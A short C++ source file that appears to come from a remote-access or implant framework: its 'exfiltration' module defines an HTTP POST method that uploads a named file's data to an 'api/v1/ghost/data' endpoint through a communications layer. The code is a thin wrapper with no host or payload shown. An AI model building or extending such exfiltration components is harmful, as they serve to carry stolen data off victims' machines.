#include "modules/exfiltration/HttpPost.hpp"
#include "network/Comms.hpp"

bool HttpPostMethod::send(const std::string& filename, const std::string& data) {
    return Comms::UploadFile("api/v1/ghost/data", filename, data);
}
